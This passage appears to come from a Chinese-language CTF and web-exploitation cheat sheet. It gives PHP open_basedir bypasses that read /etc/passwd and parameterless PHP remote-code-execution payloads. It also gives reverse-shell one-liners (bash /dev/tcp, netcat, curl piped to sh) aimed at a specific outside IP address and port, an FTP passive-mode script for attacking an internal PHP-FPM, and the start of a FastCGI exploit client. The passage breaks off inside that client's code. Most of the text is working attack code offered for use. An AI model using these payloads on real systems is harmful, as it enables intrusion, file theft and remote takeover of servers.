class="string">&#x27;glob:///*&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot;\n&quot;</span>;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span>   ---使用的是glob:<span class="comment">///伪协议，不直接触发 open_basedir 检查可绕过</span></span><br></pre></td></tr></table></figure><h2 id="3利用ini_set读取文件内容"><a class="markdownIt-Anchor" href="#3利用ini_set读取文件内容"></a> 3.利用ini_set读取文件内容:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir(&#x27;tmpdir&#x27;);                // 在当前目录下创建子目录 tmpdir</span><br><span class="line">chdir(&#x27;tmpdir&#x27;);                // 进入 tmpdir 目录</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);   // 把 open_basedir 限制设置为当前目录的上一级</span><br><span class="line">chdir(&#x27;..&#x27;);                    // 连续多次切换到上级目录</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);    // 再次尝试将 open_basedir 设置为根目录</span><br><span class="line">$a=file_get_contents(&#x27;/etc/passwd&#x27;); // 尝试读取系统用户文件</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><h2 id="4软连接"><a class="markdownIt-Anchor" href="#4软连接"></a> 4.软连接:</h2><p>关键是需要跳过多少层就需要多少级目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&quot;A&quot;);                         // 在当前工作目录创建目录 A</span><br><span class="line">chdir(&quot;A&quot;);                         // 进入目录 A</span><br><span class="line">mkdir(&quot;B&quot;);                         // 在 A 下创建目录 B</span><br><span class="line">chdir(&quot;B&quot;);                         // 进入 A/B</span><br><span class="line">mkdir(&quot;C&quot;);                         // 在 A/B 下创建目录 C</span><br><span class="line">chdir(&quot;C&quot;);                         // 进入 A/B/C</span><br><span class="line">mkdir(&quot;D&quot;);                         // 在 A/B/C 下创建目录 D</span><br><span class="line">chdir(&quot;D&quot;);                         // 进入 A/B/C/D</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 A/B/C （上一级）</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 A/B</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 A</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 当前脚本最初的工作目录（上上上上级）</span><br><span class="line">symlink(&quot;A/B/C/D&quot;,&quot;7abc&quot;);         // 在当前目录创建符号链接 7abc -&gt; A/B/C/D</span><br><span class="line">symlink(&quot;7abc/../../../../etc/passwd&quot;,&quot;exp&quot;); // 尝试创建符号链接 exp -&gt; ../../../../etc/passwd（通过相对路径串联指向系统文件）</span><br><span class="line">unlink(&quot;7abc&quot;);                     // 删除符号链接或文件名为 7abc（如果是目录则会失败）</span><br><span class="line">mkdir(&quot;7abc&quot;);                      // 创建一个普通目录名为 7abc（替代之前的符号链接）</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="php无参rce"><a class="markdownIt-Anchor" href="#php无参rce"></a> php无参RCE:</h1><h2 id="1getallheaders"><a class="markdownIt-Anchor" href="#1getallheaders"></a> 1.getallheaders():</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">getallheaders</span>()));构造这个，问题是如果没有 <span class="keyword">eval</span>()，会被当做字符串，而不会被执行</span><br><span class="line">Zzzzzz:<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);     ----配合这个使用</span><br></pre></td></tr></table></figure><h2 id="2get_defined_vars"><a class="markdownIt-Anchor" href="#2get_defined_vars"></a> 2.get_defined_vars():</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;jiang=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>()返回由所有已定义变量所组成的数组，会返回<span class="variable">$_GET</span>,<span class="variable">$_POST</span>,<span class="variable">$_COOKIE</span>,<span class="variable">$_FILES</span>全局变量的值,返回数组顺序为get-&gt;post-&gt;cookie-&gt;files</span><br><span class="line"><span class="title function_ invoke__">current</span>() 返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<span class="variable">$_GET</span>变量的数组值。</span><br><span class="line">如果需要<span class="variable">$post</span>就把current 改成next 就好。</span><br></pre></td></tr></table></figure><h2 id="3session_start"><a class="markdownIt-Anchor" href="#3session_start"></a> 3.session_start():</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())))</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())); 或者<span class="title function_ invoke__">readgzfile</span>();</span><br><span class="line">修改cookie : PHPSESSID= filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br><span class="line">抓包传入Cookie: PHPSESSID=(<span class="string">&quot;system(&#x27;命令&#x27;)&quot;</span>的十六进制)</span><br></pre></td></tr></table></figure><h2 id="4scandir"><a class="markdownIt-Anchor" href="#4scandir"></a> 4.scandir():</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当前目录：<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br><span class="line">上级目录文件：<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))))));</span><br><span class="line">以上两个都是随机获取的其实，看脸。</span><br></pre></td></tr></table></figure><h1 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell:</h1><h2 id="1bash反弹shell"><a class="markdownIt-Anchor" href="#1bash反弹shell"></a> 1.bash反弹shell:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/139.224.54.229/4000 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">1️⃣ bash -i</span><br><span class="line">表示启动一个 交互式（interactive） bash shell，允许输入命令、输出结果。</span><br><span class="line">2️⃣ &gt;&amp; /dev/tcp/139.224.54.229/4000</span><br><span class="line">这是 Bash 的特殊语法（只有在 Bash 内置 /dev/tcp 支持时才可用）。</span><br><span class="line">意思是：</span><br><span class="line">把 标准输出（stdout）和标准错误（stderr） 都重定向到一个 TCP 连接，目标是 139.224.54.229:4000。</span><br></pre></td></tr></table></figure><h2 id="2netcat一句话反弹"><a class="markdownIt-Anchor" href="#2netcat一句话反弹"></a> 2.netcat一句话反弹:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 139.224.54.229 4000 -t  /bin/bash </span><br><span class="line">命令详解：通过webshell我们可以使用nc命令直接建立一个tcp 4000 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机（139.224.54.229）。</span><br></pre></td></tr></table></figure><h2 id="3curl反弹shell"><a class="markdownIt-Anchor" href="#3curl反弹shell"></a> 3.curl反弹shell:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://your-shell.com/139.224.54.229:4000|sh</span><br><span class="line"></span><br><span class="line">就是利用第一种bash反弹</span><br></pre></td></tr></table></figure><h1 id="ftp协议打php-fpm"><a class="markdownIt-Anchor" href="#ftp协议打php-fpm"></a> FTP协议打PHP-FPM:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line">    这个点是存在WebShell写入漏洞的，但是在不能写文件的环境下该如何利用呢？</span><br></pre></td></tr></table></figure><p>如果我们能向 PHP-FPM 发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与gopher://协议结合使用，curl支持gopher://协议，但file_get_contents却不支持。</p><p>利用FTP协议的被动模式，即：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）<strong>到一个有服务端指定的IP和端口上</strong>。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。假设此时发现内网中存在 PHP-FPM，那我们可以通过 FTP 的被动模式攻击内网的 PHP-FPM。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;0.0.0.0&#x27;,39001)) #端口可改</span><br><span class="line">s.listen(1)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(b&#x27;220 welcome\n&#x27;)</span><br><span class="line">#Service ready for new user.</span><br><span class="line">#Client send anonymous username</span><br><span class="line">#USER anonymous</span><br><span class="line">conn.send(b&#x27;331 Please specify the password.\n&#x27;)</span><br><span class="line">#User name okay, need password.</span><br><span class="line">#Client send anonymous password.</span><br><span class="line">#PASS anonymous</span><br><span class="line">conn.send(b&#x27;230 Login successful.\n&#x27;)</span><br><span class="line">#User logged in, proceed. Logged out if appropriate.</span><br><span class="line">#TYPE I</span><br><span class="line">conn.send(b&#x27;200 Switching to Binary mode.\n&#x27;)</span><br><span class="line">#Size /</span><br><span class="line">conn.send(b&#x27;550 Could not get the file size.\n&#x27;)</span><br><span class="line">#EPSV (1)</span><br><span class="line">conn.send(b&#x27;150 ok\n&#x27;)</span><br><span class="line">#PASV</span><br><span class="line">conn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;) #STOR / (2)</span><br><span class="line">conn.send(b&#x27;150 Permission denied.\n&#x27;)</span><br><span class="line">#QUIT</span><br><span class="line">conn.send(b&#x27;221 Goodbye.\n&#x27;)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>使用gopherus去生成的poc只取_后面的，因为前面是为了模仿本地去使用gopher去执行，但是现在我们是通过ftp默认让fastcgi去执行，所以直接给php代码就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> you don<span class="string">&#x27;t know press ENTER we have default one:  index.php</span></span><br><span class="line"><span class="string">Terminal command to run:  curl https://your-shell.com/139.224.54.229:4000|sh   使用反弹shell</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">file_put_contents($_GET[&#x27;</span>file<span class="string">&#x27;], $_GET[&#x27;</span>data<span class="string">&#x27;])   中 file=ftp://aaa@139.224.54.229:39001/abc</span></span><br><span class="line"><span class="string">         data=gopherus去生成的poc只取_后面的</span></span><br></pre></td></tr></table></figure><h1 id="php-fpm未授权"><a class="markdownIt-Anchor" href="#php-fpm未授权"></a> <strong>PHP-FPM未授权</strong></h1><p><strong>phpinfo里可以看到php-fpm</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Nginx 等服务器中间件将用户请求按照 fastcgi 的规则打包好通过 TCP 传给谁？其实就是传给 FPM。</span><br><span class="line">FPM 按照 fastcgi 的协议将 TCP 流解析成真正的数据。</span><br><span class="line">举个例子，用户访问http://127.0.0.1/index.php?a=1&amp;b=2，如果 web 目录是/var/www/html，那么 Nginx 会将这个请求变成如下 key-value 对：</span><br><span class="line">&#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;, &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;, &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;, &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;, &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;, &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27; &#125;</span><br><span class="line">这个数组其实就是 PHP 中$_SERVER数组的一部分，也就是 PHP 里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉 fpm：“我要执行哪个 PHP 文件”。</span><br><span class="line">PHP-FPM 拿到 fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的 PHP 文件，也就是/var/www/html/index.php。</span><br></pre></td></tr></table></figure><p><strong>poc</strong>:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bchr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bord</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_text</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastCGIClient</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span><br><span class="line">        <span class="variable language_">self</span>.host = host</span><br><span class="line">        <span class="variable language_">self</span>.port = port</span><br><span class="line">        <span class="variable language_">self</span>.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            <span class="variable language_">self</span>.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.keepalive = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.sock = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.requests = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__connect</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.sock.settimeout(<span class="variable language_">self</span>.timeout)</span><br><span class="line">        <span class="variable language_">self</span>.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.sock.connect((<span class="variable language_">self</span>.host, <span class="built_in">int</span>(<span class="variable language_">self</span>.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            <span class="variable language_">self</span>.sock.close()</span><br><span class="line">            <span class="variable language_">self</span>.sock = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">              + bchr(fcgi_type) \</span><br><span class="line">              + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">              + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">              + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">              + bchr(length 